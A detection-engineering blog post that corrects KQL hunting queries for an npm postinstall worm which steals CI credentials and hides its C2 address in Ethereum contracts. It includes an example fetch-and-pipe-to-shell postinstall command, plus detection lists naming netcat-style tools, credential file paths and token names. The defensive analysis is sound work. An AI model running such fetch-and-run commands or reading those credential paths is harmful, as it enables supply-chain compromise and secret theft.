---
layout: post
title: "KQL Detection of the Week: Sins of the Grandfather"
subtitle: "Detecting npm Lifecycle Worms When the Payload Is Two Generations Down and the C2 Is a Public Blockchain"
date: 2026-08-10
author: DevSecOpsDad
---

![DevSecOpsDadAttack!](/assets/img/SinsOfTheGrandfather/intro.png)

You typed `npm ci`. Somewhere in the 1,400 packages that resolved, one of them declared a `postinstall` script, and your build host ran it as the CI service account, with the registry token, the GitHub Actions token, and the cloud credentials all sitting in the environment. That is not a compromise. That is **npm working exactly as designed**, and it happens a few hundred times a day in most estates.

Last week the adversary borrowed your *permission* — the heapdump endpoint answered because you configured it to. This week they borrowed your **trust**, which is the harder one, because trust is transitive and permission isn't. You vetted a dependency. That dependency vetted nothing.

This week, lets talk about **ChainDrop**, a self-propagating npm worm in 400+ compromised packages, stealing registry and CI credentials from build hosts and routing its C2 through **Ethereum smart contracts**. Nine candidates across the two days, plus the `keyv`/`cacheable` worm from [Wednesday's](https://devsecopsdadattack.com/2026-08-05-detection-engineering-brief-wednesday-august-5-2026/) SANS diary, plus a Rails file read, Midnight Blizzard, AMOS, an N-central auth bypass, and a Kerberoast.

The npm cluster is worth the four thousand words, and for a specific reason: **the brief's own process-lineage query cannot see the process it is hunting.** Not because of a bad list or a loose threshold — because of a join. Act I fixes the lineage, and the fix is two columns that were already sitting on the row. Act II hunts the blockchain C2 and argues that the domain list is unwinnable, so stop maintaining one. The honorable mention stops hunting the worm entirely and inventories the thing you can actually close.

<br/>

---

<br/>

## 🥇 Act I: The Payload Is Your Grandchild

![Act I](/assets/img/SinsOfTheGrandfather/ACT_I.png)

[Friday's Detection 1](https://devsecopsdadattack.com/2026-08-07-detection-engineering-brief-friday-august-7-2026/) wants to catch ChainDrop stealing GitHub Actions runner secrets. Here is its core:

```kql
let npmInstallEvents = DeviceProcessEvents
| where InitiatingProcessFileName in~ ("node", "npm", "npm.cmd")
| where ProcessCommandLine has_any ("install", "postinstall", "ci")
| project DeviceName, AccountName, npmTime = Timestamp, npmProcId = ProcessId, ...;
let suspChildProcs = DeviceProcessEvents
| where InitiatingProcessFileName in~ ("node", "npm", "sh", "bash")
| where ProcessCommandLine has_any (secretKeywords) or FileName in~ (networkTools)
| project ..., ParentProcId = InitiatingProcessId, ...;
npmInstallEvents
| join kind=inner suspChildProcs on DeviceName, AccountName, $left.npmProcId == $right.ParentProcId
| where (childTime - npmTime) between (0s .. 120s)
```

The intent is right and the shape is wrong in three separate ways, and the third one is fatal.

**First**, the join reconstructs a parent-child relationship that is *already on the row*. `DeviceProcessEvents` carries `InitiatingProcessFileName` and `InitiatingProcessCommandLine` on the child event. You do not need a second pass over the table to learn who the parent was. The join buys nothing and costs a full extra scan.

**Second**, the join key is a PID. PIDs are recycled — aggressively, on a busy build host running thousands of short-lived processes per pipeline. `DeviceName + AccountName + ProcessId` is not an identity; `ProcessId + ProcessCreationTime` is closer, and the row already has the answer without either.

**Third, and this is the one that matters:** the child-side filter accepts `sh` and `bash` as initiating processes, and then the join demands `child.InitiatingProcessId == npm.ProcessId`. If the child's initiating process is `sh`, then `InitiatingProcessId` is *sh's* PID, which is not npm's PID. **That lane can only ever match on a PID collision.** It is dead.

And it's dead for exactly the traffic the detection exists to find. Read npm's own documentation on how a lifecycle script runs:

> Scripts are run by passing the line as a script argument to `/bin/sh` on POSIX systems or `cmd.exe` on Windows.

So the real tree is not two levels. It's three:

```
node (npm-cli.js install)
 └── sh -c -- "curl -s https://.../x.sh | sh"      <- the lifecycle script
      └── curl                                     <- the payload
```

`curl` is npm's **grandchild**. Its parent is `sh`. [Friday's query](https://devsecopsdadattack.com/2026-08-07-detection-engineering-brief-friday-august-7-2026/) looks one level down from npm and finds `sh`; it looks for `curl` and demands that `curl`'s parent be npm. Neither test can be satisfied by the actual process tree. [Thursday's Detection 4](https://devsecopsdadattack.com/2026-08-06-detection-engineering-brief-thursday-august-6-2026/) and [Friday's Detection 3](https://devsecopsdadattack.com/2026-08-07-detection-engineering-brief-friday-august-7-2026/) are honest one-level queries and at least return the `node → sh` edge — but the edge they return is the *scaffolding*, not the payload. The interesting process is one generation further down than any query in the week can reach.

**MDE gives you that generation for free.** `DeviceProcessEvents` carries `InitiatingProcessParentFileName`, `InitiatingProcessParentId`, and `InitiatingProcessParentCreationTime`. On the `curl` row, `InitiatingProcessFileName` is `sh` and `InitiatingProcessParentFileName` is `node`. The entire three-level chain is one row, no join.

And there's a bonus sitting in the same row. Since `@npmcli/run-script@4.2.1` (August 2022), npm passes the script body **inline** to the shell rather than writing it to a temp file. Which means `InitiatingProcessCommandLine` on the `curl` row is the literal `postinstall` text from the compromised package's `package.json`. **The malicious source code is a column.**

<br/>

### The KQL

```kql
let lookback = 7d;
// Image names arrive inconsistently. FileName is usually bare, but the schema documents
// InitiatingProcessParentFileName as "name OR FULL PATH", and Windows adds an extension.
// Normalize once so node, /usr/bin/node, NODE.EXE and npm.cmd all compare as one token.
let Bare = (s:string) {
    trim_end(@"\.(exe|cmd|bat|com|ps1)", tolower(extract(@"([^\\/]+)$", 1, tostring(s))))
};
// Package-manager runtimes that execute lifecycle scripts. Note "npm" is here for
// WINDOWS (npm.cmd). On Linux, /usr/bin/npm is a shebang script and the exec'd image is
// `node` -- so `InitiatingProcessFileName in~ ("npm")` returns almost nothing on a Linux
// build host, which is where your builds actually run.
let PkgRuntimes  = dynamic(["node","npm","npx","yarn","pnpm","bun","corepack"]);
// npm runs EVERY lifecycle script through a shell. This layer is the whole point of the
// query: it is why a one-level parent test sees the scaffolding and not the payload.
let ScriptShells = dynamic(["sh","bash","dash","zsh","ash","busybox","cmd","powershell","pwsh"]);
// DERIVED, not hand-kept beside the lists. A prefilter that is not a superset of the
// authoritative test is a silent narrowing, and a parallel copy drifts -- mine did, twice.
let AncestryTerms = array_concat(PkgRuntimes, ScriptShells);
let NetworkTools = dynamic(["curl","wget","nc","ncat","netcat","socat","ssh","scp","sftp","rsync"]);
let Interpreters = dynamic(["python","python3","perl","ruby","php","osascript","node"]);
let Stagers      = dynamic(["base64","xxd","openssl","tar","zip","gzip","bzip2","7z","chmod"]);
// SUBSTRING fragments, not terms. Every entry below contains a delimiter, which is
// precisely why has_any() is the wrong operator for them. See the bonus.
let SecretFragments = dynamic([
    ".npmrc","npm_token","npm-token",".git-credentials",".gitconfig",".netrc",
    ".aws/credentials",".aws/config",".config/gh/hosts.yml",".kube/config",
    ".docker/config.json",".ssh/id_","gcloud/credentials","github_token",
    "actions_runtime_token","actions_id_token","runner/work/_temp","/proc/self/environ",
    "printenv","process.env"
]);
DeviceProcessEvents
| where Timestamp > ago(lookback)
// Indexed prefilter on the RAW columns. This is the ONE place in this article where
// has_any is the correct operator: every needle is a single alphanumeric term, so the
// term index can serve it, and "node" as a term also matches node.exe and /usr/bin/node.
// ("sh" is two characters and falls below the index threshold -- still correct, just
// scanned rather than looked up.)
| where InitiatingProcessFileName has_any (AncestryTerms)
     or InitiatingProcessParentFileName has_any (AncestryTerms)
| extend Self   = Bare(FileName),
         Parent = Bare(InitiatingProcessFileName),
         Grand  = Bare(InitiatingProcessParentFileName)
// THE authoritative test, and the entire correction: TWO generations, both already on
// this row. Generation 1 is npm -> X. Generation 2 is npm -> shell -> X, which is what
// a lifecycle script actually looks like and what a PID self-join structurally cannot
// return. Recorded as a NUMBER rather than a boolean, because which generation the match
// landed in is evidence, not bookkeeping.
| extend RuntimeGen = case(
      Parent in (PkgRuntimes), 1,
      Grand  in (PkgRuntimes), 2,
                               0)
| where RuntimeGen > 0
// Classify the payload; do NOT filter on it. A shell spawned by node is scaffolding and
// a curl spawned by that shell is a payload, but both belong in the output -- the second
// one is only interpretable in the presence of the first.
| extend PayloadClass = case(
      Self in (NetworkTools), "NetworkTool",
      Self in (Stagers),      "Stager",
      Self in (Interpreters), "Interpreter",   // node is in BOTH lists; order decides
      Self in (ScriptShells), "Shell",
      Self in (PkgRuntimes),  "Runtime",
                              "Other")
| extend CmdLower  = tolower(tostring(ProcessCommandLine))
// On npm >= 8.17 this is the package.json script body itself, inline. On a gen-2 row it
// is the malicious postinstall source, verbatim, in a column.
| extend ParentCmd = tolower(tostring(InitiatingProcessCommandLine))
// Substring-any over the authoritative fragment list. There is no contains_any() in KQL,
// and has_any() is a TERM test that would answer a different question for every one of
// these needles. mv-apply is the idiom -- ONE list, consumed mechanically, rather than a
// regex alternation maintained in parallel with it.
| mv-apply Frag = SecretFragments to typeof(string) on (
      summarize SecretHits = make_set_if(Frag, CmdLower contains Frag
                                            or ParentCmd contains Frag, 12)
  )
| extend SecretRef = strcat_array(SecretHits, " ")
// Lifecycle context, recovered from the data rather than assumed. Ranked, not gated:
// "None" still appears in the output, because a shell under node with no node_modules
// path is either a toolchain quirk worth learning or a payload worth reading.
| extend LifecycleEvidence = case(
      ParentCmd contains "node_modules/",                "NodeModulesPath",
      ParentCmd contains "npm-cli.js",                   "NpmCli",
      ParentCmd matches regex @"\b(pre|post)?install\b", "InstallPhase",
      CmdLower  contains "node_modules/",                "NodeModulesPathChild",
                                                         "None")
// Scoped package names have a slash in them, so the (?:@[^/\s]+/)? group is not optional
// decoration -- without it every @scope/pkg reports as "@scope".
| extend PkgFromParent = extract(@"node_modules/((?:@[^/\s]+/)?[^/\s]+)/", 1, ParentCmd)
| extend PkgFromSelf   = extract(@"node_modules/((?:@[^/\s]+/)?[^/\s]+)/", 1, CmdLower)
// NOT coalesce(). extract() returns an EMPTY STRING on no match, not null, and coalesce()
// takes the first NON-NULL value -- so a miss on the first argument would win over a hit
// on the second. Same shape as last week's zero-versus-null byte counter, different
// function, and it was in my first draft here too.
| extend PkgName = iff(isempty(PkgFromParent), PkgFromSelf, PkgFromParent)
// Entity = the DEVICE. A build host is the unit of compromise here: the token lives on
// it, the worm republishes from it, and the package that started it is an attribute.
| summarize
    Events         = count(),
    // The generation split is the headline number. Gen2 > 0 means a lifecycle script ran
    // something, which is the finding; Gen1-only means the toolchain spawned a shell and
    // nothing came of it.
    Gen2Events     = countif(RuntimeGen == 2),
    NetworkRuns    = countif(PayloadClass == "NetworkTool"),
    StagerRuns     = countif(PayloadClass == "Stager"),
    InterpRuns     = countif(PayloadClass == "Interpreter" and RuntimeGen == 2),
    SecretRuns     = countif(array_length(SecretHits) > 0),
    SecretsSeen    = make_set_if(SecretRef, isnotempty(SecretRef), 20),
    Packages       = make_set_if(PkgName, isnotempty(PkgName), 30),
    Chains         = make_set(strcat(iff(isempty(Grand), "?", Grand), " > ", Parent,
                                     " > ", Self), 15),
    Payloads       = make_set(Self, 20),
    LifecycleTags  = make_set(LifecycleEvidence, 5),
    // take_anyif, not take_any(iff(...)): take_any picks an arbitrary row, and an
    // arbitrary row is very often the one where the iff returned "".
    SampleScript   = take_anyif(InitiatingProcessCommandLine, RuntimeGen == 2),
    SampleCmd      = take_anyif(ProcessCommandLine, PayloadClass != "Shell"),
    Accounts       = make_set(AccountName, 10),
    // DeviceName is a label, not an identity -- it changes on rename and collides across
    // a fleet. DeviceId is the key; the names ride along so triage can find the box.
    DeviceNames    = make_set(DeviceName, 5),
    ActiveDays     = dcount(bin(Timestamp, 1d)),
    FirstSeen      = min(Timestamp),
    LastSeen       = max(Timestamp)
    by DeviceId
| extend
    DistinctPackages = array_length(Packages),
    DistinctPayloads = array_length(Payloads),
    ReachedGen2      = Gen2Events > 0,
    RenamedInWindow  = array_length(DeviceNames) > 1
// Ranking, in order of what changes your afternoon:
//   1. a lifecycle process touched a credential path
//   2. it reached the network
//   3. it got to generation 2 at all
//   4. it staged or encoded something
//   5. breadth of packages executing scripts
// Raw event count is last on purpose. One postinstall is the whole incident; forty
// thousand node-gyp invocations are Tuesday.
| order by SecretRuns desc, NetworkRuns desc, Gen2Events desc, StagerRuns desc,
           DistinctPackages desc, Events desc
```

<br/>

### The line that does the work

```kql
| extend RuntimeGen = case(
      Parent in (PkgRuntimes), 1,
      Grand  in (PkgRuntimes), 2,
                               0)
| where RuntimeGen > 0
```

Four lines, no join, and they return a process tree that a self-join on PID cannot express.

Note what this **isn't**. It isn't a join, so there is no PID-reuse hazard, no second table scan, and no join window to tune. It isn't `InitiatingProcessFileName in~ ("node")` either, which is the one-level test in [Thursday's](https://devsecopsdadattack.com/2026-08-06-detection-engineering-brief-thursday-august-6-2026/) and [Friday's](https://devsecopsdadattack.com/2026-08-07-detection-engineering-brief-friday-august-7-2026/) queries and which answers a strictly narrower question than the one being asked. And it isn't a `has` against a command line hoping the word `postinstall` shows up somewhere — that's a question about strings, and this is a question about **structure**.

The reason it works is a schema fact worth memorizing: **`DeviceProcessEvents` gives you two ancestors, not one.** `InitiatingProcess*` is the parent. `InitiatingProcessParent*` is the grandparent. Almost every hunting query in circulation uses the first family and ignores the second, and for most techniques that's fine, because most techniques put the interesting process one level down. Package-manager lifecycle scripts are structurally different: the shell layer is *mandatory*, it's inserted by the tool rather than the attacker, and it pushes every payload to depth two.

Recording it as a number rather than a boolean is deliberate. `RuntimeGen` is the column an analyst reads first:

| `RuntimeGen` | Shape | What it means |
|---|---|---|
| `1` | `node → sh` | The toolchain spawned a shell. Expected during any install. |
| `1` | `node → node` | A script re-entered node — `node-gyp`, a build step, or a stage-two loader. |
| `2` | `node → sh → curl` | **A lifecycle script reached the network.** |
| `2` | `node → sh → base64` | A lifecycle script encoded something. |
| `0` | filtered out | No package-manager runtime in either ancestor slot. |

Note the ordering inside the `case`, because it decides one ambiguous shape. `case` returns on first match and `Parent` is tested first, so a `node → node → curl` chain — a script that re-entered node before shelling out — reports `RuntimeGen = 1`, not 2, even though both ancestor slots hold a runtime. That's the *shallower* answer, and it's the conservative one: it under-reports depth rather than inventing it. `Chains` stays in the output so an analyst can see the shape that produced the number instead of trusting the number alone.

And the honest limit: **MDE stops at two.** A chain of `npm → sh → node → sh → curl` — a stage-two loader that re-enters node before shelling out again — puts `curl` at depth four, and the two ancestor slots on its row show `sh` and `node`, with no package manager visible at all. That row scores `RuntimeGen = 0` and is discarded. There is no column for it. If you need depth three or more, you are back to a join, and at that point the right join key is `DeviceId + InitiatingProcessId + InitiatingProcessCreationTime` — never PID alone, for the reason [Friday's query](https://devsecopsdadattack.com/2026-08-07-detection-engineering-brief-friday-august-7-2026/) demonstrates.

<br/>

### `has` is not a prefix operator, and `ACTIONS_` is not a prefix

Friday's secret list is this:

```kql
let secretKeywords = dynamic(["GITHUB_TOKEN", "ACTIONS_", "SECRET", "printenv"]);
...
| where ProcessCommandLine has_any (secretKeywords)
```

The trailing underscore on `ACTIONS_` is doing something specific in the author's head: it's meant to match `ACTIONS_RUNTIME_TOKEN`, `ACTIONS_ID_TOKEN_REQUEST_URL`, and the rest of the runner's variable family. It's a prefix.

`has_any` does not do prefixes. KQL breaks a string into **terms** — maximal runs of alphanumeric characters — and `has` tests whether a whole term is present. An underscore is not alphanumeric, so it is a delimiter. `ACTIONS_` tokenizes to the single term `actions`, and the predicate becomes:

```kql
| where ProcessCommandLine has "actions"
```

On a GitHub Actions runner. Where the workspace is `/home/runner/work/_actions/`, every composite action is checked out under that path, and the word appears in a substantial fraction of every command line the host executes. The clause doesn't fail closed; it fails **open**, into the noisiest possible predicate on that specific asset class.

`GITHUB_TOKEN` has the opposite problem for the same reason. Two terms, `github` and `token`, with a delimiter between them — a multi-token needle under an operator whose contract is a single whole term. Microsoft's own guidance is explicit: if you're looking for a term that contains delimiters, use `contains`. Anything else is inferring adjacency from an operator that doesn't promise it.

The operator that does prefixes is `hasprefix` — and here it wouldn't help either, which is the part worth sitting with. `hasprefix` matches a **term** prefix, and `ACTIONS_RUNTIME_TOKEN` has already been split by the underscore into `ACTIONS`, `RUNTIME`, `TOKEN`. So `hasprefix "actions"` matches the term `ACTIONS`, which is exactly what `has "actions"` already did. Reaching for the prefix operator feels like the fix and changes nothing, because the damage was done by the tokenizer before either operator ran.

Reason about the tokenizer, not the operator name. The reliable answer for a delimiter-bearing fragment is `contains`, and for a list of them, the `mv-apply` in the query above.

**Which is the error I made too.** My first draft of the fragment test was:

```kql
| where CmdLower has_any (SecretFragments)          // don't
```

Twenty needles. Every single one contains a `.`, a `/`, or a `_`. Not one of them asks the question I wrote it to ask, and `.npmrc` — which happens to tokenize cleanly to `npmrc` and therefore *works* — was the entry I spot-checked before moving on. The one that worked was the one I tested.

<br/>

### The exclusion that excludes `version`

[Thursday's Detection 4](https://devsecopsdadattack.com/2026-08-06-detection-engineering-brief-thursday-august-6-2026/) tries to suppress benign toolchain noise:

```kql
| where ProcessCommandLine !has "--version"
    and ProcessCommandLine !has " -v "
    and ProcessCommandLine !has "--help"
    and ProcessCommandLine !has "-version"
```

Four narrow-looking flags. Under the tokenizer they are three predicates, and two of them are enormous:

- `!has "--version"` and `!has "-version"` are **the same predicate**: both tokenize to the term `version`. Together they drop every command line containing the standalone word `version` anywhere — `curl https://api.internal/v2/version`, `node scripts/version-check.js`, `sh -c "cat package.json | jq .version"`.
- `!has " -v "` tokenizes to the term `v`. One character, below the three-character index threshold, so it forces a column scan *and* drops any command line containing a lone `v` token — including `/opt/build/v/…` and `sh -c 'curl -v'`, which was the intent, and a great deal else, which was not.

The direction of failure is what makes this worth a section. A too-narrow `has` returns nothing and you notice. A too-broad **`!has` deletes findings**, silently, and the query still returns plenty of rows so it looks healthy. Negation is where tokenizer sloppiness turns from noise into blindness, and it is the one place I'd insist on `!contains` even at the performance cost — because `!contains " -v "` means what it says.

<br/>

### Keeping it honest

Act I is a hunt, not a scheduled rule, and the gap is mostly volume:

- **`node → sh → X` is not rare. It is constant.** `node-gyp` shells out to compile native addons. `husky` installs git hooks. `esbuild`, `sharp`, `puppeteer`, and every package with a prebuilt binary run a `postinstall` that curls a tarball from a CDN. On a busy build fleet this query returns thousands of rows a day and **most of them are correct behaviour**. That's why nothing here is filtered and everything is classified: the output is a ranked table, and the row you care about is the one where `SecretRuns > 0`. Baseline for two weeks before you put a threshold on anything.
- **`SecretRuns` is the only column I'd alert on today.** A lifecycle script whose command line references `.npmrc`, `~/.aws/credentials`, or `/proc/self/environ` has no benign reading I've been able to construct. `NetworkRuns` has several thousand.
- **The command line is the script *body*, not the script's behaviour.** A `postinstall` reading `node -e "require('./lib/steal')"` shows you nine harmless characters. Everything the loader does after that is in a file you can't see, and the only evidence is the next process it spawns — which lands at generation three and is therefore invisible to this query. The clean version of the payload is the one you miss.
- **`DeviceProcessEvents` cannot see an environment variable read, and [Friday's Detection 1](https://devsecopsdadattack.com/2026-08-07-detection-engineering-brief-friday-august-7-2026/) is titled as though it can.** "Secret Extraction via Environment Variable Access" describes an operation with **no telemetry**. `process.env.GITHUB_TOKEN` inside a Node script produces exactly zero events on any platform. What you detect is not the read; it's what the value was used *for* — a process spawned with it on the command line, an outbound connection, an authentication somewhere else. This is the same structural finding as last week's heapdump article from a different angle, and it's now three weeks running: **reads are the least instrumented operation in the stack**, and modern credential theft lives entirely inside that gap.
- **Verify the ancestry column is populated on your Linux build hosts before you trust the generation split.** MDE for Linux has had coverage variation around process ancestry across agent versions. Ten seconds of proof beats an assumption:

  ```kql
  DeviceProcessEvents
  | where Timestamp > ago(7d)
  | where InitiatingProcessFileName has_any ("node","npm","sh","bash")
  | summarize Events = count(),
              ParentPopulated = countif(isnotempty(InitiatingProcessFileName)),
              GrandPopulated  = countif(isnotempty(InitiatingProcessParentFileName))
      by OSPlatform = tostring(column_ifexists("DeviceName",""))
  ```

  Swap the grouping key for whatever you use to split platforms. If `GrandPopulated` is materially below `ParentPopulated` on a platform, `RuntimeGen = 2` can never fire there and the query is quietly a one-level detection wearing a two-level comment.
- **Ephemeral runners are the coverage question, and they're most of the risk.** GitHub-hosted runners are not MDE-onboarded and never will be. Every query in this article — mine and the briefs' — is blind to them by construction. If your pipelines run on GitHub-hosted infrastructure, host telemetry is not your control surface; `ignore-scripts`, lockfile pinning, and a registry proxy are, which is the honorable mention's whole argument.
- **`corepack` is on my runtime list and I have not verified its process shape.** It's in there because it wraps yarn and pnpm and it seemed obviously right. That is exactly the kind of entry that turns out to exec differently than assumed. Check it in your estate before you count on it.

<br/>

---

<br/>

## 🥈 Act II: The Dead Drop Is a Public Utility

![Act II](/assets/img/SinsOfTheGrandfather/ACT_II.png)

ChainDrop's C2 does not have an IP address you can block.

The worm reads its next-stage address out of an **Ethereum smart contract**. To do that it makes an ordinary HTTPS POST to a JSON-RPC endpoint — Infura, Alchemy, a public node, anything — containing an `eth_call`. The response is a hex blob that decodes to a URL. Take down the URL and the operator writes a new one into contract storage for a few cents of gas, and every infected host picks it up on its next poll. There is no takedown, because the thing hosting the pointer is a distributed consensus network with about a million participants and no abuse desk.

This is not new as a *shape* — it's a dead drop resolver, the same idea as a C2 address hidden in a Pastebin post or a Twitter bio — but the blockchain version removes the last lever defenders had. A Pastebin post can be deleted. A GitHub gist can be taken down. **A contract storage slot cannot.**

[Friday's Detection 2](https://devsecopsdadattack.com/2026-08-07-detection-engineering-brief-friday-august-7-2026/) goes after it like this:

```kql
let ethRpcPorts = dynamic([8545, 8546]);
let ethApiDomains = dynamic(["infura.io", "alchemy.com", "etherscan.io",
                             "cloudflare-eth.com", "ankr.com", "quicknode.pro"]);
DeviceNetworkEvents
| where InitiatingProcessFileName in~ ("node", "npm", "npm.cmd", "sh", "bash", "python", "python3")
| where RemotePort in (ethRpcPorts)
    or RemoteUrl has_any (ethApiDomains)
```

It's the week's only production-rated network candidate and it has four problems, in ascending order of interest.

**The port list is decoration.** `8545` and `8546` are the ports a local `geth` or `hardhat` node listens on. Every public provider in the domain list beside it serves TLS on **443**. The brief's own tuning note concedes this — *"Consider adding a RemotePort filter for HTTPS (443) to catch TLS-wrapped RPC calls that would not use port 8545/8546"* — which is an admission that the port clause cannot match the traffic the detection is about. It sits on the left of an `or`, so it costs nothing and catches nothing except your own developers' local test nodes.

**`quicknode.pro` is not a domain.** QuickNode's RPC endpoints are `<name>.quiknode.pro` — no `c`. `quicknode.com` is the marketing site and the REST admin API; the JSON-RPC surface is `quiknode.pro`. The entry as written can never match anything, and it will sit in that list looking authoritative until someone types it into a browser.

**`has_any` on domains is the tokenizer problem again.** `"infura.io"` is two terms with a delimiter between them. Same class of error as `GITHUB_TOKEN` in Act I, in a different query, in a different brief, on a different day.

**And the fourth one is the real one: the list cannot be finished.** Infura, Alchemy, QuickNode, Ankr, dRPC, Chainstack, BlockPI, NodeReal, PublicNode, LlamaRPC, 1RPC, Blast, Tenderly, Moralis, Omnia, Gateway.fm — that's off the top of my head, it's incomplete, and it grows. Cloudflare's Ethereum Gateway lets a customer bind the RPC surface to **their own hostname**, so a subset of the provider space is by design not enumerable. And underneath all of it: anyone can run `geth` on a VPS and expose JSON-RPC on 443 behind nginx, and it will look like an API call to an unremarkable host.

A denylist of a public utility is not a detection. It's a subscription.

So the query below keeps the provider list — as a **label**, worth having, correctly implemented — and puts the actual detection somewhere else: **a first-seen destination baseline, scoped to processes in the build toolchain.** The premise is that a build host has a small, boring, extremely stable egress footprint. It talks to your registry, your artifact store, your VCS, a CDN or two, and your cloud provider's metadata service. It does not develop new correspondents. When one does, that is interesting regardless of whether the destination is on anybody's list.

<br/>

### The KQL

```kql
let lookback  = 14d;   // findings window
let baseline  = 45d;   // total window; baseline is (45d .. 14d ago)
// Parse a destination host out of RemoteUrl, which arrives as a bare hostname from some
// sensors, a full URL from others, and empty for a raw socket. Order matters: strip the
// scheme FIRST or "https" reads as a hostname, and strip the path BEFORE the port or a
// URL like https://host/a:b loses everything after the colon in the PATH.
let HostOf = (u:string) {
    let lower    = tolower(tostring(u));
    let noScheme = trim_start(@"[a-z][a-z0-9+.\-]*://", lower);
    let noPath   = tostring(split(noScheme, "/")[0]);
    // A bracketed IPv6 literal must lose its brackets, not be split on its own colons.
    let noPort   = iff(noPath startswith "[",
                       trim_start(@"\[", tostring(split(noPath, "]")[0])),
                       tostring(split(noPath, ":")[0]));
    trim_end(@"\.", noPort)   // the FQDN root dot: "infura.io." and "infura.io" are one host
};
// REGISTRABLE DOMAINS, not URLs and not substrings. Every real RPC endpoint is a
// subdomain -- mainnet.infura.io, eth-mainnet.g.alchemy.com, x.ethereum.quiknode.pro --
// so the test has to be suffix-shaped. Used for LABELLING, not filtering.
// NOTE: quiknode.pro, not quicknode.pro. The brief has the marketing domain.
let RpcSuffixes = dynamic([
    "infura.io","alchemy.com","quiknode.pro","ankr.com","publicnode.com","llamarpc.com",
    "drpc.org","blastapi.io","chainstack.com","chainstacklabs.com","nodereal.io",
    "blockpi.network","1rpc.io","etherscan.io","blockscout.com","cloudflare-eth.com",
    "flashbots.net","merkle.io","tenderly.co","moralis.io","omniatech.io","gateway.fm",
    "binance.org","polygon-rpc.com"
]);
// Self-hosted / local nodes. Kept because a build host talking to ANY of these is odd,
// not because the worm's provider would use them.
let RpcPorts   = dynamic([8545, 8546, 8551, 30303]);
let BuildProcs = dynamic(["node","npm","npx","yarn","pnpm","bun","sh","bash","dash","zsh",
                          "curl","wget","python","python3","cmd","powershell","pwsh"]);
// materialize() because this is referenced twice below. Without it the subexpression is
// evaluated twice -- double cost, and two evaluations that can straddle a boundary and
// disagree about what "45 days ago" meant.
let Egress = materialize(
    DeviceNetworkEvents
    | where Timestamp > ago(baseline)
    | where InitiatingProcessFileName has_any (BuildProcs)
    | extend Host = HostOf(tostring(column_ifexists("RemoteUrl", "")))
    // THREE states, not two. An empty Host is not "no destination" -- it is a raw socket
    // whose only identity is an IP, and those are exactly the connections a domain list
    // can never see. Collapsing them into the name space would silently baseline them all
    // together under "".
    | extend DestKind = case(
          isnotempty(Host),                    "Name",
          isnotempty(tostring(RemoteIP)),      "IpOnly",
                                               "Unknown")
    | extend Dest = case(
          DestKind == "Name",   Host,
          DestKind == "IpOnly", strcat("ip:", tostring(RemoteIP)),
                                "unknown")
    | project Timestamp, DeviceId, DeviceName, Dest, DestKind, Host, RemoteIP, RemotePort,
              InitiatingProcessFileName, InitiatingProcessCommandLine,
              InitiatingProcessParentFileName, InitiatingProcessAccountName, ActionType
);
let Prior = Egress
| where Timestamp between (ago(baseline) .. ago(lookback))
| summarize by DeviceId, Dest;
Egress
| where Timestamp > ago(lookback)
// Dot-anchored suffix match. NOT has_any: "infura.io" is two terms to the tokenizer and
// has is a whole-term test. NOT contains either: `Host contains "ankr.com"` is true for
// ankr.com.attacker.tld, which is a free bypass. Equality-or-dotted-suffix is the only
// form that means "this host, or something under it".
| mv-apply Suffix = RpcSuffixes to typeof(string) on (
      summarize RpcMatch = make_set_if(Suffix,
            Host == Suffix or Host endswith strcat(".", Suffix), 3)
  )
| extend KnownRpcHost = array_length(RpcMatch) > 0
| extend RpcPortHit   = RemotePort in (RpcPorts)
// leftouter + isnull, NOT leftanti. leftanti would DELETE the baselined rows, and the
// baselined rows are how you tell "this host has always talked to Infura" (a web3 team)
// from "this host started last Tuesday" (the finding). Classify, then rank.
| join kind=leftouter (Prior | extend SeenBefore = true) on DeviceId, Dest
| extend FirstSeenForDevice = isnull(SeenBefore)
| extend Verdict = case(
      KnownRpcHost and FirstSeenForDevice,          "NewBlockchainRpc",
      KnownRpcHost,                                 "BaselinedBlockchainRpc",
      RpcPortHit,                                   "RpcPortDestination",
      FirstSeenForDevice and DestKind == "IpOnly",  "NewUnnamedDestination",
      FirstSeenForDevice,                           "NewDestination",
                                                    "Baselined")
| summarize
    Connections   = count(),
    Successes     = countif(ActionType == "ConnectionSuccess"),
    Ports         = make_set(RemotePort, 10),
    Ips           = make_set_if(tostring(RemoteIP), isnotempty(tostring(RemoteIP)), 10),
    RpcLabels     = make_set_if(tostring(RpcMatch), KnownRpcHost, 5),
    Processes     = make_set(InitiatingProcessFileName, 10),
    // The grandparent again: a curl whose grandparent is node is a lifecycle script
    // reaching the network, which is the exact chain Act I ranks. This column is the
    // join between the two queries, and it costs nothing.
    Grandparents  = make_set_if(InitiatingProcessParentFileName,
                                isnotempty(InitiatingProcessParentFileName), 10),
    SampleCmd     = take_any(InitiatingProcessCommandLine),
    Accounts      = make_set(InitiatingProcessAccountName, 5),
    DeviceNames   = make_set(DeviceName, 5),
    ActiveDays    = dcount(bin(Timestamp, 1d)),
    FirstSeen     = min(Timestamp),
    LastSeen      = max(Timestamp)
    by DeviceId, Dest, DestKind, Verdict
| extend
    NpmAncestry = set_intersect(Grandparents, dynamic(["node","npm","node.exe","npm.cmd"])),
    Beaconish   = ActiveDays >= 3 and Connections >= (ActiveDays * 5)
| extend HasNpmAncestry = array_length(NpmAncestry) > 0
// A first-seen blockchain endpoint reached by a process whose grandparent is node is the
// top of this table and there is nothing close to it. Everything below that is a hunt.
| order by HasNpmAncestry desc,
           (Verdict == "NewBlockchainRpc") desc,
           (Verdict == "NewUnnamedDestination") desc,
           Beaconish desc, Connections desc
```

<br/>

### The line that does the work

```kql
| summarize RpcMatch = make_set_if(Suffix,
        Host == Suffix or Host endswith strcat(".", Suffix), 3)
```

That is a registrable-domain test, and it is the correct form of a check that gets written wrong constantly.

Three candidate operators, three different questions:

| Predicate | `mainnet.infura.io` | `infura.io` | `evil-infura.io` | `infura.io.attacker.tld` |
|---|---|---|---|---|
| `Host has_any (["infura.io"])` | undefined — multi-token needle | undefined | undefined | undefined |
| `Host contains "infura.io"` | ✅ | ✅ | ✅ **wrong** | ✅ **wrong** |
| `Host == S or Host endswith "." + S` | ✅ | ✅ | ❌ correct | ❌ correct |

The `contains` row is the one worth staring at. `evil-infura.io` and `infura.io.attacker.tld` are both registerable by anyone with twelve dollars, and both defeat a `contains` check on a domain — the first by prefixing, the second by suffixing. That is not a theoretical bypass; domain-substring matching is one of the most reliably defeated controls in the industry, and the fix is one `strcat`.

